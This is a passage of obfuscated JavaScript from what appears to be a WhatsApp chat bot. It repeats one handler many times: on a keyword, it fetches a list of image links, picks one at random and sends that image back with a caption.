`${_0x2363[192]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[193]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[194]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[195]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[196]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[197]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[198]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[199]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[200]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[201]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[202]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[203]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[204]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[205]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[206]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[207]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[208]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[209]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[210]}`){reply(`${_0x2363[4]}${petik}${_0x2363[185]}${titik}${_0x2363[4]}${petik}${_0x2363[4]}`);fetch(`${_0x2363[211]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[212]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[213]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[214]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[215]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[216]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[217]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[218]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[219]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[220]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[221]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[222]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[223]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[224]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[225]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[226]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[227]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[228]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[229]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[230]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[231]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[232]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[233]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[234]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[235]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[236]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[237]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[238]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[239]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[240]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[241]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[242]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[243]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[244]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[245]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[246]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[247]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[248]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[249]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[250]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[251]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[252]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[253]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[254]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[255]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== `${_0x2363[256]}`){reply(mess[_0x2363[73]]);fetch(`${_0x2363[257]}`)[_0x2363[135]]((_0xa9f7x1e)=>{return _0xa9f7x1e[_0x2363[190]]()})[_0x2363[135]]((_0xa9f7x23)=>{let _0xa9f7x24=_0xa9f7x23[_0x2363[81]](_0x2363[114]);let _0xa9f7x25=_0xa9f7x24[Math[_0x2363[176]](Math[_0x2363[175]]()* _0xa9f7x24[_0x2363[43]])];imageToBase64(_0xa9f7x25)[_0x2363[135]]((_0xa9f7x26)=>{media= Buffer[_0x2363[187]](_0xa9f7x26,_0x2363[186]);alpha[_0x2363[10]](from,media,image,{quoted:ftoko,caption:`${_0x2363[4]}${petik}${_0x2363[188]}${petik}${_0x2363[4]}${n}${_0x2363[189]}`})})[_0x2363[134]]((_0xa9f7x5)=>{console[_0x2363[61]](_0xa9f7x5)})})};if(budy=== 